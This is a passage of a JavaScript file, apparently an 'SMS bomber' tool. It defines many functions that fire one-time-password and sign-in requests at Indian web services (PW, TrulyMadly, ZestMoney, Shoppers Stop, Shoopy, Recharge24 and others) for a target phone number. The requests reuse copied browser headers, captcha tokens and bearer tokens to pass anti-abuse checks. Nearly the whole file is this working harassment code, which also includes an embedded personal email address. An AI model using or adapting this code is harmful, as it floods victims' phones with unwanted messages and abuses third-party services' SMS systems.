JdH1UhDi51zcjyXrLBUFoJ813iA5C53NDdKknrODCtUXX8kCF5mBrVeT9fH3bNNIoqBAOW5SP-0iep1ErAvvFXKsHZgcyCelBeasZtVT_bXJexGUU1Mf4dOJwe3GzdyLQ2IR9sNN9OevjbT9AUwFb0Gv1MU0k1ngrpdpH9JJjCO6zb8AoIF366eJPVhyQmYsaB520f7PWvsFh4lD5RiNKC1fNv71Tu9kjecONdzUPrjx9fQ5T53lnSw8IqU8wJe73gcyRj3e4MufHwQb_MRnrd1aMkXPinFUOoRC7S9bB9GFOuukLs5YLjLbR_kP59gha8wwzM9hwzJNA8bzdb69R7QlVLW-bvULDcgaHhmPjtGqd3KTYtlWfxemfEPsQwYB_Y_A0lW4jnUTS2Vwpc_UtVwjn7axV5GcnkcjfkxAA-jftwHEyhGgkdg7YZI_jImqfKKFS3EAGITM3Lz6zkdAkeZIUEsANWty6WkH4x43aNJHKGLnp5T1MvqepPmWra6bOq4TufUgXF1ZjS4y1lGKp6gNlGQzeogkW8U_9TS9A-hjTV46wcMlhVg6wprz22OR_ySDgP7ozCa13UyTtWZNRwjCkD4I56VXtPc07yYL4M2WoBOOnv1ZVRJvtxJIgN9mA9dNtHnjbwZDHG6Mvj3zLf_YByz585hG7DsrPznNOLO6SRI_WJVtKnJgKtl_DfM4l3nKBEUmNnFnxgPfPFGSSKGONM2GIlVKJofTGn9A32nZ7BfXhBV0jpYj696--FpmsarxCSQjOF8mv1XLLCX0vEiiez8FPWMJUAmMhL37fqCs3N2oDzt5OrGCbOgIEK-oM8IGaEaMA1-AXsoYetJUjOY68R_jsh_3BSe6hGAD_t90gDqJV-5obM-07eZmfc8nogHgmfTYRFXLy6pwedPF1BabfqogmlrsKkVHbgi4Dqz6AaEmy-F5TGrfCAqdEx6rAQYvkN8sUSbPxmkeo4U_ku-MU9D14u2K7BzfiY-kPvY1LfBpAhFNYylTRTajLX59Bune3r6ktIqk5vmNtp9TnnHWqXNZ8vtmSCsnqYRhM-aHPBRx0bnlw0-4JJAcKl3MgbH44zx6iyKdyeHKwD5RG0KYPWbjJd607HL0-Rf2HK-_HdrRR6e0l_lu_nZn0KcilNF-7Q5OvxQpb-5J-_XwsVbgQInq85NZMT3scEtbOi3s8Ud1vmSKrQmpLLwDBeBLDTqBaNtRD22fjIObX8tzF5ieQCRFX1cyrzGs5pkyJ4I3agVVz0K-Lg5rG5GVh8DG23WOTS307K7pAS3S_qTkVCcaXg6j3gLALo5_8fKvwE5VRe6uI4AzOoRgTKFyYp15C-FAS2mUi7glv2chWQtCCz8M436hg3RXSYPMVA6IR45gwScugRBx2U3Nz5r8-DuGnRruor12FWk99OTy7XjkkEJkLK1v7q1Pt-KBcsLlla4EbKKxjCGdZcSBz4yCI1EnP_ElLyCWvqC_lVY9khp5PIuq_zsaET-YAhezrRoaN5789wb6dVUzeEZZIHr_S-Dp67hT2KMJg0WcZgh5ivpcWH7qSufh_opSbZ990mBfb7Empv6PDXchFUFj2BM-OVsK-aUzKUewxgWPRzyS6QJnJ1nfYQ"}',
    method: "POST",
  });
};

const fetchPW = async () => {
  const res = await fetch(
    "https://api.penpencil.co/v1/users/register-secure/5eb393ee95fab7468a79d189?smsType=0",
    {
      headers: {
        accept: "*/*",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        "client-id": "5eb393ee95fab7468a79d189",
        "client-type": "WEB",
        "content-type": "application/json",
        priority: "u=1, i",
        randomid: "30dd8311-6874-4744-8939-2936f1f4cdaa",
        "sec-ch-ua":
          '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "x-sdk-version": "0.0.34",
        Referer: "https://www.pw.live/",
      },
      body: `{"mobile":"${phone}","countryCode":"+91","firstName":"Jodsfk","subOrgId":"SUB-PWLI000","captchaToken":"1.BjgGF7Q44C4Y8ZuPIxalO0Zho0i3eo0YCu9PFLlJKxYFj2uCk-XjHEpz44xPYSRKDjs6Fa4vWaI3Rw445UWp3plE015CcMWxYSjv7y0dr1THV4cxC9AvZ8f3-6H-pxCFL5CwlhtjWP03QvCnHPIVLhK3Bu0dg4tIugnjv2EPIlTfKjMTlSFezzGzA9hpWSRwACXXp_JNr9UjBMGo2MvKQIUfEfYdHb7dPAo1-ju3QxToMDlVJGfjv3AqZ-bk_XCKVs8ZR-CLXyeON5vA9tccBdYhkneCSVVJrM0bPZxgqPa7PI7ZFVwqFIPyw1n-GjYWqyAC378aG4rHY48XhbViosQxMZfuL7jPVPrDYmAOEO7DrxcVK-i_Koy0kZeaWC16pUaBAvcza9JTrAsKU88pOglSjMAmYQDKiwAfbZQqqKxX-4ReQDIYUvX_2IaPpkBZE0lVwzAfNUguHkTrR84IXI6_tMTwDr1BLBBIL-WPO1DoKHpWn6M7VR7LExYg0vGxJTG4Nj8orkeQ1spGue0TyQa-lmVW6brF3HS8RfniFsVYdzYcZoaknroo1cNU43jWrFPV4Icl03lRJgb4x1HMldNh3xur-yo1klF-57f93WfBQ862M35h4khqdh4JzcFGFG3oATgjggFz0-zxb_jrPg.EKcSRTDhp4Ue2PRxYxgMSw.e7d10dad8506f6a52a5ad0eece54ecbc1f3521cb85d3067feebefd725d4944e1","captchaSiteKey":"0x4AAAAAABmMfnuMzLn8_C02"}`,
      method: "POST",
    },
  );
  const data = await res.json();
  console.log();
};

const fetchTruly = async () => {
  fetch("https://app.trulymadly.com/api/auth/mobile/v1/send-otp", {
    headers: {
      accept: "application/json, text/javascript, */*; q=0.01",
      "accept-language": "en",
      app_version_code: "1316",
      app_version_name: "7.0.4",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      source: "web_pwa",
      "system-language": "en",
      Referer: "https://trulymadly.com/",
    },
    body: `country_code=91&mobile=${phone}`,
    method: "POST",
  });
};
const fetchZest = async () => {
  fetch("https://authentication.zestmoney.in/v2/mobile/otp/", {
    headers: {
      accept: "application/json",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "cache-control": "no-cache",
      "content-type": "application/json",
      pragma: "no-cache",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      token: "135b043150475d7288b936606e086af5c1fb7f0eff15256748f5ad078ebdcf85",
      Referer: "https://app.zestmoney.in/",
    },
    body: `{"MobileNumber":"91${phone}"}`,
    method: "POST",
  });
};
const fetchSS = async () => {
  fetch("https://api-v1.shoppersstop.com/v2/olg/sendOTP", {
    headers: {
      accept: "*/*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      authorization: "",
      "cache-control": "no-cache",
      "content-type": "application/json",
      "device-memory": "8",
      downlink: "10",
      dpr: "1",
      ect: "4g",
      pragma: "no-cache",
      priority: "u=1, i",
      rtt: "50",
      "sec-ch-device-memory": "8",
      "sec-ch-dpr": "1",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-ch-viewport-width": "537",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      "viewport-width": "537",
      Referer: "https://www.shoppersstop.com/",
    },
    body: `{"mobile":"${phone}","type":"SIGNIN_WITH_MOBILE"}`,
    method: "POST",
  });
};
const fetchSuperProfile = async () => {
  fetch("https://prod.api.cosmofeed.com/api/user/authenticate", {
    headers: {
      accept: "*/*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      authorization: "Bearer null",
      "content-type": "application/json",
      "cosmofeed-request-id": "f22fb012-a050-45f8-9806-6478cf8ab996",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "cross-site",
      Referer: "https://superprofile.bio/",
    },
    body: `{"loginType":"phoneNumber","phoneNumber":"${phone}","countryCode":"+91","data":{"email":"aakashsingh123@gmail.com","phone":"${phone}"},"authScreen":"signup-screen","userIsConvertingToCreator":false}`,
    method: "POST",
  });
};
const fetchShoopy = async () => {
  fetch("https://ia.api.shoopy.in/api/v1/auth/oauth/v2/otp?slug=", {
    headers: {
      accept: "*/*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      authorization: "Bearer 9028aa05-508c-4ee7-bb8d-5224c0f31c11",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      "x-requested-with": "XMLHttpRequest",
      Referer: "https://web.shoopy.in/",
    },
    body: `{"mobile":"+91${phone}","channel":"sms"}`,
    method: "POST",
  });
};
const fetchShoopyWhatsapp = async () => {
  fetch("https://ia.api.shoopy.in/api/v1/auth/oauth/v2/otp?slug=", {
    headers: {
      accept: "*/*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      authorization: "Bearer 9028aa05-508c-4ee7-bb8d-5224c0f31c11",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      "x-requested-with": "XMLHttpRequest",
      Referer: "https://web.shoopy.in/",
    },
    body: `{"mobile":"+91${phone}","channel":"whatsapp"}`,
    method: "POST",
  });
};
const fetchShoopySignin = async () => {
  fetch("https://ia.api.shoopy.in/api/v1/auth/oauth/v2/otp?slug=", {
    headers: {
      accept: "*/*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      authorization: "Bearer 9028aa05-508c-4ee7-bb8d-5224c0f31c11",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      "x-requested-with": "XMLHttpRequest",
    },
    referrer: "https://web.shoopy.in/",
    body: `{"mobile":"+91${phone}","channel":"sms"}`,
    method: "POST",
    mode: "cors",
    credentials: "include",
  });
};
const fetchRecharge24 = async () => {
  await fetch("https://api.recharge24.in/auth/sendotp", {
    headers: {
      accept: "*/*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      Referer: "https://app.recharge24.in/",
    },
    body: '{"hash":"U2FsdGVkX1+6DAWG5xDtG1O474KSmyUvDMSELFiildk="}',
    method: "POST",
  });
  await fetch("https://api.recharge24.in/info/number", {
    headers: {
      accept: "*/*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      Referer: "https://app.recharge24.in/",
    },
    body: `{"number":${phone}}`,
    method: "POST",
  });
};
const fetchDuebill = async () => {
  fetch("https://api.duebill.in/auth/sendotp", {
    headers: {
      accept: "*/*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      Referer: "https://duebill.in/",
    },
    body: '{"hash":"U2FsdGVkX1884f2RQxSdX9kZ88RqYX2mWHa8diq272s="}',
    method: "POST",
  });
  fetch("https://api.duebill.in/info/number", {
    headers: {
      accept: "*/*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      Referer: "https://duebill.in/",
    },
    body: `{"number":${phone}}`,
    method: "POST",
  });
};
const fetchProvilac = async () => {
  fetch(
    `https://pune.provilac.com/restapi/customer/sendOTP/v2?mobileNumber=${phone}&cityName=Delhi%20NCR&resendOtp=false`,
    {
      headers: {
        accept: "application/json, text/plain, */*",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        priority: "u=1, i",
        "sec-ch-ua":
          '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        Referer: "https://provilac.com/",
      },
      body: null,
      method: "POST",
    },
  );
};
const fetchNetaSampark = async () => {
  fetch("https://api.netasampark.com/api/auth/citizen/send-otp", {
    headers: {
      accept: "application/json",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      Referer: "https://netasampark.com/",
    },
    body: `{"phone":"${phone}"}`,
    method: "POST",
  });
};
const fetch143ds = async () => {};
const fetch14df3 = async () => {};
const fetch14fg3 = async () => {};
const fetch1423 = async () => {};

//  all functions total number of functions are 20

export {
  setPhone,
  fetchKhatabook,
  fetchZeeott,
  fetchDistrict,
  fetchAllen,
  fetchHungama,
  fetchShoopySignin,
  fetchPayme,
  fetchAstrosage,
  fetchVyapar,
  fetchShoopy,
  fetchTruly,
  fetchZest,
  fetchSS,
  fetchSuperProfile,
  fetchShoopyWhatsapp,
  fetchProvilac,
  fetchNetaSampark,
};
